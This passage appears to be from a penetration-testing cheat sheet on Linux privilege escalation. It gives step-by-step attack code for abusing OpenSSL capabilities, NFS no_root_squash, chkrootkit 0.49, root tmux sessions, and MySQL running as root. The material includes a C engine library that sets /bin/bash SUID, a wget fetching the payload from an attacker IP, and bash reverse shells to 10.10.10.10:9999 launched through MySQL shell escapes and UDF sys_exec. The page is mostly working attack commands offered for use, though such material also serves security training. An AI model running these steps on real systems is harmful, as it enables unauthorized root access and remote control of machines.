</code></pre></div> <p>OpenSSL</p> <p>Victim <div class=highlight><pre><span></span><code><a id=__codelineno-64-1 name=__codelineno-64-1 href=#__codelineno-64-1></a><span class=n>getcap</span> <span class=n>-r</span> <span class=p>/</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span>         
<a id=__codelineno-64-2 name=__codelineno-64-2 href=#__codelineno-64-2></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>openssl</span> <span class=p>=</span> <span class=n>cap_setuid</span><span class=p>+</span><span class=n>ep</span>
</code></pre></div></p> <p>Attacker Create a .so file - Code below vi priv.c <div class=highlight><pre><span></span><code><a id=__codelineno-65-1 name=__codelineno-65-1 href=#__codelineno-65-1></a><span class=c>#include &lt;openssl/engine.h&gt;</span>
<a id=__codelineno-65-2 name=__codelineno-65-2 href=#__codelineno-65-2></a><span class=c>#include &lt;stdio.h&gt;</span>
<a id=__codelineno-65-3 name=__codelineno-65-3 href=#__codelineno-65-3></a><span class=c>#include &lt;stdlib.h&gt;</span>
<a id=__codelineno-65-4 name=__codelineno-65-4 href=#__codelineno-65-4></a><span class=c>#include &lt;sys/types.h&gt;</span>
<a id=__codelineno-65-5 name=__codelineno-65-5 href=#__codelineno-65-5></a><span class=c>#include &lt;unistd.h&gt;</span>
<a id=__codelineno-65-6 name=__codelineno-65-6 href=#__codelineno-65-6></a>
<a id=__codelineno-65-7 name=__codelineno-65-7 href=#__codelineno-65-7></a><span class=n>static</span> <span class=n>const</span> <span class=n>char</span> <span class=p>*</span><span class=n>engine_id</span> <span class=p>=</span> <span class=s2>&quot;test&quot;</span><span class=p>;</span>
<a id=__codelineno-65-8 name=__codelineno-65-8 href=#__codelineno-65-8></a><span class=n>static</span> <span class=n>const</span> <span class=n>char</span> <span class=p>*</span><span class=n>engine_name</span> <span class=p>=</span> <span class=s2>&quot;hope it works&quot;</span><span class=p>;</span>
<a id=__codelineno-65-9 name=__codelineno-65-9 href=#__codelineno-65-9></a>
<a id=__codelineno-65-10 name=__codelineno-65-10 href=#__codelineno-65-10></a><span class=n>static</span> <span class=n>int</span> <span class=n>bind</span><span class=p>(</span><span class=n>ENGINE</span> <span class=p>*</span><span class=n>e</span><span class=p>,</span> <span class=n>const</span> <span class=n>char</span> <span class=p>*</span><span class=n>id</span><span class=p>)</span>
<a id=__codelineno-65-11 name=__codelineno-65-11 href=#__codelineno-65-11></a><span class=p>{</span>
<a id=__codelineno-65-12 name=__codelineno-65-12 href=#__codelineno-65-12></a>  <span class=n>int</span> <span class=n>ret</span> <span class=p>=</span> <span class=n>0</span><span class=p>;</span>
<a id=__codelineno-65-13 name=__codelineno-65-13 href=#__codelineno-65-13></a>
<a id=__codelineno-65-14 name=__codelineno-65-14 href=#__codelineno-65-14></a>  <span class=k>if</span> <span class=p>(!</span><span class=n>ENGINE_set_id</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>engine_id</span><span class=p>))</span> <span class=p>{</span>
<a id=__codelineno-65-15 name=__codelineno-65-15 href=#__codelineno-65-15></a>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s2>&quot;ENGINE_set_id failed\n&quot;</span><span class=p>);</span>
<a id=__codelineno-65-16 name=__codelineno-65-16 href=#__codelineno-65-16></a>    <span class=n>goto</span> <span class=k>end</span><span class=p>;</span>
<a id=__codelineno-65-17 name=__codelineno-65-17 href=#__codelineno-65-17></a>  <span class=p>}</span>
<a id=__codelineno-65-18 name=__codelineno-65-18 href=#__codelineno-65-18></a>  <span class=k>if</span> <span class=p>(!</span><span class=n>ENGINE_set_name</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>engine_name</span><span class=p>))</span> <span class=p>{</span>
<a id=__codelineno-65-19 name=__codelineno-65-19 href=#__codelineno-65-19></a>    <span class=n>printf</span><span class=p>(</span><span class=s2>&quot;ENGINE_set_name failed\n&quot;</span><span class=p>);</span>
<a id=__codelineno-65-20 name=__codelineno-65-20 href=#__codelineno-65-20></a>    <span class=n>goto</span> <span class=k>end</span><span class=p>;</span>
<a id=__codelineno-65-21 name=__codelineno-65-21 href=#__codelineno-65-21></a>  <span class=p>}</span>
<a id=__codelineno-65-22 name=__codelineno-65-22 href=#__codelineno-65-22></a>  <span class=n>setuid</span><span class=p>(</span><span class=n>0</span><span class=p>);</span>
<a id=__codelineno-65-23 name=__codelineno-65-23 href=#__codelineno-65-23></a>  <span class=n>setgid</span><span class=p>(</span><span class=n>0</span><span class=p>);</span>
<a id=__codelineno-65-24 name=__codelineno-65-24 href=#__codelineno-65-24></a>  <span class=n>system</span><span class=p>(</span><span class=s2>&quot;chmod +s /bin/bash&quot;</span><span class=p>);</span>    
<a id=__codelineno-65-25 name=__codelineno-65-25 href=#__codelineno-65-25></a>  <span class=n>system</span><span class=p>(</span><span class=s2>&quot;echo Complete!&quot;</span><span class=p>);</span>
<a id=__codelineno-65-26 name=__codelineno-65-26 href=#__codelineno-65-26></a>  <span class=n>ret</span> <span class=p>=</span> <span class=n>1</span><span class=p>;</span>
<a id=__codelineno-65-27 name=__codelineno-65-27 href=#__codelineno-65-27></a> <span class=k>end</span><span class=p>:</span>
<a id=__codelineno-65-28 name=__codelineno-65-28 href=#__codelineno-65-28></a>  <span class=k>return</span> <span class=n>ret</span><span class=p>;</span>
<a id=__codelineno-65-29 name=__codelineno-65-29 href=#__codelineno-65-29></a><span class=p>}</span>
<a id=__codelineno-65-30 name=__codelineno-65-30 href=#__codelineno-65-30></a>
<a id=__codelineno-65-31 name=__codelineno-65-31 href=#__codelineno-65-31></a><span class=n>IMPLEMENT_DYNAMIC_BIND_FN</span><span class=p>(</span><span class=n>bind</span><span class=p>)</span>
<a id=__codelineno-65-32 name=__codelineno-65-32 href=#__codelineno-65-32></a><span class=n>IMPLEMENT_DYNAMIC_CHECK_FN</span><span class=p>()</span>
</code></pre></div></p> <p>Compile Code &amp; Create .so file</p> <div class=highlight><pre><span></span><code><a id=__codelineno-66-1 name=__codelineno-66-1 href=#__codelineno-66-1></a><span class=n>gcc</span> <span class=n>-c</span> <span class=n>fPIC</span> <span class=n>priv</span><span class=p>.</span><span class=n>c</span> <span class=n>-o</span> <span class=n>priv</span>
<a id=__codelineno-66-2 name=__codelineno-66-2 href=#__codelineno-66-2></a><span class=n>gcc</span> <span class=n>-shared</span> <span class=n>-o</span> <span class=n>priv</span><span class=p>.</span><span class=n>so</span> <span class=n>-lcrypto</span> <span class=n>priv</span>
</code></pre></div> <p>Victim</p> <p>Download .so from Attacker</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-67-1 name=__codelineno-67-1 href=#__codelineno-67-1></a><span class=nb>wget </span><span class=n>-O</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>priv</span><span class=p>.</span><span class=n>so</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>:</span><span class=n>9000</span><span class=p>/</span><span class=n>priv</span><span class=p>.</span><span class=n>so</span>
<a id=__codelineno-67-2 name=__codelineno-67-2 href=#__codelineno-67-2></a>
<a id=__codelineno-67-3 name=__codelineno-67-3 href=#__codelineno-67-3></a><span class=p>//</span> <span class=n>Replace</span> <span class=n>IP</span> <span class=p>&amp;</span> <span class=n>Port</span>
</code></pre></div> Get Root</p> <div class=highlight><pre><span></span><code><a id=__codelineno-68-1 name=__codelineno-68-1 href=#__codelineno-68-1></a>openssl req -engine /tmp/priv.so
<a id=__codelineno-68-2 name=__codelineno-68-2 href=#__codelineno-68-2></a>/bin/bash -p
<a id=__codelineno-68-3 name=__codelineno-68-3 href=#__codelineno-68-3></a>id &amp;&amp; whoami
</code></pre></div> <h2 id=nfs-root-squashing><strong>NFS Root Squashing</strong><a class=headerlink href=#nfs-root-squashing title="Permanent link">&para;</a></h2> <p>Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network.</p> <ul> <li> <p>rw: Permit clients to read as well as write access to the shared directory.</p> </li> <li> <p>ro: Permit clients to Read-only access to shared directory.</p> </li> <li> <p>root_squash: This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account.</p> </li> <li> <p>no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication.</p> </li> <li> <p>async: It will speed up transfers but can cause data corruption as NFS server doesn’t wait for the complete write operation to be finished on the stable storage, before replying to the client.</p> </li> <li> <p>sync: The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage.</p> </li> </ul> <p>Enumeration</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-69-1 name=__codelineno-69-1 href=#__codelineno-69-1></a><span class=n>Victim</span>
<a id=__codelineno-69-2 name=__codelineno-69-2 href=#__codelineno-69-2></a>
<a id=__codelineno-69-3 name=__codelineno-69-3 href=#__codelineno-69-3></a>
<a id=__codelineno-69-4 name=__codelineno-69-4 href=#__codelineno-69-4></a><span class=nb>cat </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>exports</span>             <span class=p>//</span> <span class=k>Do</span> <span class=n>we</span> <span class=n>see</span> <span class=n>any</span> <span class=n>no_root_squash</span> <span class=n>enabled</span> <span class=n>on</span> <span class=n>a</span> <span class=n>mounted</span> <span class=n>share</span><span class=p>?</span>
<a id=__codelineno-69-5 name=__codelineno-69-5 href=#__codelineno-69-5></a>
<a id=__codelineno-69-6 name=__codelineno-69-6 href=#__codelineno-69-6></a><span class=p>/</span><span class=n>tmp</span> <span class=p>*(</span><span class=n>rw</span><span class=p>,</span><span class=n>sync</span><span class=p>,</span><span class=n>insecure</span><span class=p>,</span><span class=n>no_root_squash</span><span class=p>,</span><span class=n>no</span><span class=p>,</span><span class=n>subtree</span><span class=p>,</span><span class=n>check</span><span class=p>)</span> 
<a id=__codelineno-69-7 name=__codelineno-69-7 href=#__codelineno-69-7></a>
<a id=__codelineno-69-8 name=__codelineno-69-8 href=#__codelineno-69-8></a><span class=n>Attacker</span>
<a id=__codelineno-69-9 name=__codelineno-69-9 href=#__codelineno-69-9></a>
<a id=__codelineno-69-10 name=__codelineno-69-10 href=#__codelineno-69-10></a><span class=n>nmap</span> <span class=n>-sV</span> <span class=p>-</span><span class=n>-script</span><span class=p>=</span><span class=n>nfs-showmount</span> <span class=p>&lt;</span><span class=n>victim_ip</span><span class=p>&gt;</span> 
</code></pre></div> Privilege Escalation</p> <p>Attacker</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-70-1 name=__codelineno-70-1 href=#__codelineno-70-1></a><span class=n>showmount</span> <span class=n>-e</span> <span class=p>&lt;</span><span class=n>victim_ip</span><span class=p>&gt;</span>                      
<a id=__codelineno-70-2 name=__codelineno-70-2 href=#__codelineno-70-2></a><span class=n>mkdir</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=nb>mount </span>                               
<a id=__codelineno-70-3 name=__codelineno-70-3 href=#__codelineno-70-3></a><span class=nb>mount </span><span class=n>-o</span> <span class=n>rw</span><span class=p>,</span><span class=n>vers</span><span class=p>=</span><span class=n>2</span> <span class=p>&lt;</span><span class=n>victim_ip</span><span class=p>&gt;:/</span><span class=n>tmp</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=nb>mount </span> 
<a id=__codelineno-70-4 name=__codelineno-70-4 href=#__codelineno-70-4></a><span class=nb>echo </span><span class=s1>&#39;int main() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; }&#39;</span> <span class=p>&gt;</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>mount</span><span class=p>/</span><span class=n>priv</span><span class=p>.</span><span class=n>c</span>  
<a id=__codelineno-70-5 name=__codelineno-70-5 href=#__codelineno-70-5></a><span class=n>gcc</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>mount</span><span class=p>/</span><span class=n>priv</span><span class=p>.</span><span class=n>c</span> <span class=n>-o</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>mount</span><span class=p>/</span><span class=n>priv</span>
<a id=__codelineno-70-6 name=__codelineno-70-6 href=#__codelineno-70-6></a><span class=n>chmod</span> <span class=p>+</span><span class=n>s</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>mount</span><span class=p>/</span><span class=n>priv</span>
<a id=__codelineno-70-7 name=__codelineno-70-7 href=#__codelineno-70-7></a>
<a id=__codelineno-70-8 name=__codelineno-70-8 href=#__codelineno-70-8></a><span class=n>OR</span>
<a id=__codelineno-70-9 name=__codelineno-70-9 href=#__codelineno-70-9></a>
<a id=__codelineno-70-10 name=__codelineno-70-10 href=#__codelineno-70-10></a><span class=n>showmount</span> <span class=n>-e</span> <span class=p>&lt;</span><span class=n>victim_ip</span><span class=p>&gt;</span>   
<a id=__codelineno-70-11 name=__codelineno-70-11 href=#__codelineno-70-11></a><span class=n>mkdir</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=nb>mount </span>
<a id=__codelineno-70-12 name=__codelineno-70-12 href=#__codelineno-70-12></a><span class=nb>mount </span><span class=n>-o</span> <span class=n>rw</span><span class=p>,</span><span class=n>vers</span><span class=p>=</span><span class=n>2</span> <span class=p>&lt;</span><span class=n>victim_ip</span><span class=p>&gt;:/</span><span class=n>tmp</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=nb>mount </span> 
<a id=__codelineno-70-13 name=__codelineno-70-13 href=#__codelineno-70-13></a><span class=nb>cd </span><span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=nb>mount</span>
<a id=__codelineno-70-14 name=__codelineno-70-14 href=#__codelineno-70-14></a><span class=nb>cp </span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=p>.</span>
<a id=__codelineno-70-15 name=__codelineno-70-15 href=#__codelineno-70-15></a><span class=n>chmod</span> <span class=p>+</span><span class=n>s</span> <span class=n>bash</span>
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-71-1 name=__codelineno-71-1 href=#__codelineno-71-1></a><span class=n>Victim</span>
<a id=__codelineno-71-2 name=__codelineno-71-2 href=#__codelineno-71-2></a>
<a id=__codelineno-71-3 name=__codelineno-71-3 href=#__codelineno-71-3></a><span class=nb>cd </span><span class=p>/</span><span class=n>tmp</span>
<a id=__codelineno-71-4 name=__codelineno-71-4 href=#__codelineno-71-4></a><span class=p>./</span><span class=n>priv</span>
<a id=__codelineno-71-5 name=__codelineno-71-5 href=#__codelineno-71-5></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
<a id=__codelineno-71-6 name=__codelineno-71-6 href=#__codelineno-71-6></a>
<a id=__codelineno-71-7 name=__codelineno-71-7 href=#__codelineno-71-7></a><span class=n>OR</span>
<a id=__codelineno-71-8 name=__codelineno-71-8 href=#__codelineno-71-8></a>
<a id=__codelineno-71-9 name=__codelineno-71-9 href=#__codelineno-71-9></a><span class=nb>cd </span><span class=p>/</span><span class=n>tmp</span>
<a id=__codelineno-71-10 name=__codelineno-71-10 href=#__codelineno-71-10></a><span class=p>./</span><span class=n>bash</span> <span class=n>-p</span>
<a id=__codelineno-71-11 name=__codelineno-71-11 href=#__codelineno-71-11></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div></p> <h2 id=chkrootkit-049><strong>chkrootkit 0.49</strong><a class=headerlink href=#chkrootkit-049 title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-72-1 name=__codelineno-72-1 href=#__codelineno-72-1></a>Expliot: https://www.exploit-db.com/exploits/33899
<a id=__codelineno-72-2 name=__codelineno-72-2 href=#__codelineno-72-2></a>
<a id=__codelineno-72-3 name=__codelineno-72-3 href=#__codelineno-72-3></a>cat /etc/cron.daily
<a id=__codelineno-72-4 name=__codelineno-72-4 href=#__codelineno-72-4></a>
<a id=__codelineno-72-5 name=__codelineno-72-5 href=#__codelineno-72-5></a>/usr/bin/chkrootkit
<a id=__codelineno-72-6 name=__codelineno-72-6 href=#__codelineno-72-6></a>ls -la /usr/bin/chkrootkit     // Do we have SUID?
<a id=__codelineno-72-7 name=__codelineno-72-7 href=#__codelineno-72-7></a>chkrootkit -V
<a id=__codelineno-72-8 name=__codelineno-72-8 href=#__codelineno-72-8></a>echo &quot;#!/bin/bash&quot; &gt; /tmp/update
<a id=__codelineno-72-9 name=__codelineno-72-9 href=#__codelineno-72-9></a>echo &quot;chmod +s /bin/bash&quot; &gt;&gt; /tmp/update
<a id=__codelineno-72-10 name=__codelineno-72-10 href=#__codelineno-72-10></a>Wait a While ...
<a id=__codelineno-72-11 name=__codelineno-72-11 href=#__codelineno-72-11></a>/bin/bash -p
<a id=__codelineno-72-12 name=__codelineno-72-12 href=#__codelineno-72-12></a>id &amp;&amp; whoami
</code></pre></div> <h2 id=tmux><strong>Tmux</strong><a class=headerlink href=#tmux title="Permanent link">&para;</a></h2> <p>tmux is a terminal multiplexer for Unix-like operating systems.</p> <p>It allows multiple terminal sessions to be accessed simultaneously in a single window.</p> <p>It is useful for running more than one command-line program at the same time.</p> <p>Tmux Cheat Sheet: <a href=https://tmuxcheatsheet.com/ >https://tmuxcheatsheet.com/</a></p> <p>Privilege Escalation</p> <div class=highlight><pre><span></span><code><a id=__codelineno-73-1 name=__codelineno-73-1 href=#__codelineno-73-1></a>tmux list-sessions                        // Any Tmux sessions running as root?
<a id=__codelineno-73-2 name=__codelineno-73-2 href=#__codelineno-73-2></a>/tmp/tmux-14/default-root                 // Root Tmux Session
<a id=__codelineno-73-3 name=__codelineno-73-3 href=#__codelineno-73-3></a>tmux -S /tmp/tmux-14/default-root         // Replace Path to Socket (Depending on your results)
<a id=__codelineno-73-4 name=__codelineno-73-4 href=#__codelineno-73-4></a>
<a id=__codelineno-73-5 name=__codelineno-73-5 href=#__codelineno-73-5></a>OR
<a id=__codelineno-73-6 name=__codelineno-73-6 href=#__codelineno-73-6></a>
<a id=__codelineno-73-7 name=__codelineno-73-7 href=#__codelineno-73-7></a>tmux list-sessions                        // Any Tmux sessions running as root?
<a id=__codelineno-73-8 name=__codelineno-73-8 href=#__codelineno-73-8></a>/tmp/tmux-14/default-root                 // Root Tmux Session
<a id=__codelineno-73-9 name=__codelineno-73-9 href=#__codelineno-73-9></a>tmux -S /opt/.dev/gbm/ attach -t 0        // Replace Path to Session (Depending on your results)
</code></pre></div> <h2 id=mysql-running-as-root><strong>MySQL Running as root</strong><a class=headerlink href=#mysql-running-as-root title="Permanent link">&para;</a></h2> <p>Example 1 <div class=highlight><pre><span></span><code><a id=__codelineno-74-1 name=__codelineno-74-1 href=#__codelineno-74-1></a><span class=nb>ps </span><span class=n>aux</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>root</span>
<a id=__codelineno-74-2 name=__codelineno-74-2 href=#__codelineno-74-2></a>
<a id=__codelineno-74-3 name=__codelineno-74-3 href=#__codelineno-74-3></a><span class=n>mysql</span> <span class=n>-u</span> <span class=n>root</span> <span class=n>-p</span>
<a id=__codelineno-74-4 name=__codelineno-74-4 href=#__codelineno-74-4></a>
<a id=__codelineno-74-5 name=__codelineno-74-5 href=#__codelineno-74-5></a><span class=p>\!</span> <span class=n>chmod</span> <span class=p>+</span><span class=n>s</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>
<a id=__codelineno-74-6 name=__codelineno-74-6 href=#__codelineno-74-6></a><span class=n>exit</span>
<a id=__codelineno-74-7 name=__codelineno-74-7 href=#__codelineno-74-7></a><span class=nb>ls </span><span class=n>-la</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>                          <span class=p>//</span> <span class=n>Verify</span> <span class=n>that</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>bit</span> <span class=n>is</span> <span class=nb>set</span>
<a id=__codelineno-74-8 name=__codelineno-74-8 href=#__codelineno-74-8></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=n>-p</span> 
<a id=__codelineno-74-9 name=__codelineno-74-9 href=#__codelineno-74-9></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div></p> <p>Example 2</p> <p>Victim <div class=highlight><pre><span></span><code><a id=__codelineno-75-1 name=__codelineno-75-1 href=#__codelineno-75-1></a><span class=nb>ps </span><span class=n>aux</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>root</span>
<a id=__codelineno-75-2 name=__codelineno-75-2 href=#__codelineno-75-2></a>
<a id=__codelineno-75-3 name=__codelineno-75-3 href=#__codelineno-75-3></a><span class=n>mysql</span> <span class=n>-u</span> <span class=n>root</span> <span class=n>-p</span>
<a id=__codelineno-75-4 name=__codelineno-75-4 href=#__codelineno-75-4></a>
<a id=__codelineno-75-5 name=__codelineno-75-5 href=#__codelineno-75-5></a><span class=p>\!</span> <span class=n>bash</span> <span class=n>-i</span> <span class=p>&gt;&amp;</span> <span class=p>/</span><span class=n>dev</span><span class=p>/</span><span class=n>tcp</span><span class=p>/</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>/</span><span class=n>9999</span> <span class=n>0</span><span class=p>&gt;&amp;</span><span class=n>1</span>
</code></pre></div> Attacker</p> <div class=highlight><pre><span></span><code><a id=__codelineno-76-1 name=__codelineno-76-1 href=#__codelineno-76-1></a><span class=n>nc</span> <span class=n>-lvnp</span> <span class=n>9999</span>
<a id=__codelineno-76-2 name=__codelineno-76-2 href=#__codelineno-76-2></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> <h2 id=mysql-udf-user-defined-functions-code-udf-injection><strong>MySQL UDF (User-Defined Functions) Code (UDF) Injection</strong><a class=headerlink href=#mysql-udf-user-defined-functions-code-udf-injection title="Permanent link">&para;</a></h2> <p>User Defined Function (UDF) is a piece of code that extends the functionality of a MySQL server by adding a new function that behaves just like a native (built-in) MySQL function, such as abs() or concat() UDFs are useful when you need to extend the functionality of your MySQL server For penetration testing, we can include a UDF inside our database that loads a library that has the ability to execute commands via the sys_exec() function which gives us code execution</p> <p>Example 1 - Reverse Shell </p> <p>Download UDF (Linux - 64 Bit) = <a href=https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64>https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64</a> Download UDF (Linux - 32 Bit) = <a href=https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32>https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32</a></p> <p>Victim <div class=highlight><pre><span></span><code><a id=__codelineno-77-1 name=__codelineno-77-1 href=#__codelineno-77-1></a><span class=nb>ps </span><span class=n>aux</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>root</span>                        <span class=p>//</span>  <span class=n>Verify</span> <span class=n>that</span> <span class=n>MySQL</span> <span class=n>is</span> <span class=n>running</span> <span class=n>as</span> <span class=n>root</span>
<a id=__codelineno-77-2 name=__codelineno-77-2 href=#__codelineno-77-2></a><span class=n>Save</span> <span class=n>the</span> <span class=n>UDF</span> <span class=k>in</span> <span class=n>the</span> <span class=p>/</span><span class=n>tmp</span> <span class=n>folder</span> <span class=p>(</span> <span class=n>Example</span><span class=p>:</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>lib_mysqludf_sys</span><span class=p>.</span><span class=n>so</span><span class=p>)</span>
<a id=__codelineno-77-3 name=__codelineno-77-3 href=#__codelineno-77-3></a><span class=n>mysql</span> <span class=n>-u</span> <span class=n>root</span> <span class=n>-p</span>
<a id=__codelineno-77-4 name=__codelineno-77-4 href=#__codelineno-77-4></a>
<a id=__codelineno-77-5 name=__codelineno-77-5 href=#__codelineno-77-5></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>use</span> <span class=n>mysql</span><span class=p>;</span>
<a id=__codelineno-77-6 name=__codelineno-77-6 href=#__codelineno-77-6></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>create</span> <span class=n>table</span> <span class=n>admin</span><span class=p>(</span><span class=n>line</span> <span class=n>blob</span><span class=p>);</span>
<a id=__codelineno-77-7 name=__codelineno-77-7 href=#__codelineno-77-7></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>insert</span> <span class=n>into</span> <span class=n>admin</span> <span class=n>values</span><span class=p>(</span><span class=n>load_file</span><span class=p>(</span><span class=s1>&#39;/tmp/lib_mysqludf_sys.so&#39;</span><span class=p>));</span>
<a id=__codelineno-77-8 name=__codelineno-77-8 href=#__codelineno-77-8></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=nb>select </span><span class=p>*</span> <span class=n>from</span> <span class=n>admin</span> <span class=n>into</span> <span class=n>dumpfile</span> <span class=s1>&#39;/usr/lib/lib_mysqludf_sys.so&#39;</span><span class=p>;</span>
<a id=__codelineno-77-9 name=__codelineno-77-9 href=#__codelineno-77-9></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>create</span> <span class=k>function</span> <span class=n>sys_exec</span> <span class=n>returns</span> <span class=n>integer</span> <span class=n>soname</span> <span class=s1>&#39;lib_mysqludf_sys.so&#39;</span><span class=p>;</span>
<a id=__codelineno-77-10 name=__codelineno-77-10 href=#__codelineno-77-10></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=nb>select </span><span class=n>sys_exec</span><span class=p>(</span><span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/9999 0&gt;&amp;1&#39;</span><span class=p>);</span>
<a id=__codelineno-77-11 name=__codelineno-77-11 href=#__codelineno-77-11></a>
<a id=__codelineno-77-12 name=__codelineno-77-12 href=#__codelineno-77-12></a><span class=p>//</span> <span class=n>Any</span> <span class=n>UDF</span> <span class=n>library</span> <span class=n>can</span> <span class=n>be</span> <span class=n>used</span> <span class=p>,</span> <span class=n>as</span> <span class=n>long</span> <span class=n>as</span> <span class=n>it</span> <span class=n>is</span> <span class=n>exploitable</span> <span class=n>via</span> <span class=n>the</span> <span class=n>sys_exec</span><span class=p>()</span> <span class=k>function</span>
<a id=__codelineno-77-13 name=__codelineno-77-13 href=#__codelineno-77-13></a><span class=p>//</span> <span class=n>The</span> <span class=s2>&quot;admin&quot;</span> <span class=n>table</span> <span class=n>name</span> <span class=n>can</span> <span class=n>be</span> <span class=n>named</span> <span class=n>anything</span>
<a id=__codelineno-77-14 name=__codelineno-77-14 href=#__codelineno-77-14></a><span class=p>//</span> <span class=n>Ensure</span> <span class=n>that</span> <span class=n>the</span> <span class=n>path</span> <span class=n>to</span> <span class=n>the</span> <span class=n>UDF</span> <span class=p>(.</span><span class=n>so</span><span class=p>)</span> <span class=n>is</span> <span class=n>correct</span>
<a id=__codelineno-77-15 name=__codelineno-77-15 href=#__codelineno-77-15></a><span class=p>//</span> <span class=n>Replace</span> <span class=n>IP</span> <span class=p>&amp;</span> <span class=n>Port</span>
</code></pre></div> Attacker <div class=highlight><pre><span></span><code><a id=__codelineno-78-1 name=__codelineno-78-1 href=#__codelineno-78-1></a><span class=n>nc</span> <span class=n>-lvnp</span> <span class=n>9999</span>
</code></pre></div></p> <p>Example 2 (Local via SUID)</p> <p>Download UDF (Linux - 64 Bit) = <a href=https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64>https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64</a> Download UDF (Linux - 32 Bit) = <a href=https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32>https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32</a></p> <p>Victim</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-79-1 name=__codelineno-79-1 href=#__codelineno-79-1></a><span class=nb>ps </span><span class=n>aux</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>root</span>                        <span class=p>//</span>  <span class=n>Verify</span> <span class=n>that</span> <span class=n>MySQL</span> <span class=n>is</span> <span class=n>running</span> <span class=n>as</span> <span class=n>root</span>
<a id=__codelineno-79-2 name=__codelineno-79-2 href=#__codelineno-79-2></a><span class=n>Save</span> <span class=n>the</span> <span class=n>UDF</span> <span class=k>in</span> <span class=n>the</span> <span class=p>/</span><span class=n>tmp</span> <span class=n>folder</span> <span class=p>(</span> <span class=n>Example</span><span class=p>:</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>lib_mysqludf_sys</span><span class=p>.</span><span class=n>so</span><span class=p>)</span>
<a id=__codelineno-79-3 name=__codelineno-79-3 href=#__codelineno-79-3></a><span class=n>mysql</span> <span class=n>-u</span> <span class=n>root</span> <span class=n>-p</span>
<a id=__codelineno-79-4 name=__codelineno-79-4 href=#__codelineno-79-4></a>
<a id=__codelineno-79-5 name=__codelineno-79-5 href=#__codelineno-79-5></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>use</span> <span class=n>mysql</span><span class=p>;</span>
<a id=__codelineno-79-6 name=__codelineno-79-6 href=#__codelineno-79-6></a><span class=n>mysql</span><span class=p>&gt;</span> <span class=n>create</span> <span class=n>table</span> <span class=n>admin</span><span class=p>(</span><span class=n>line</span> <span class=n>blob</span><span class=p>);</span>
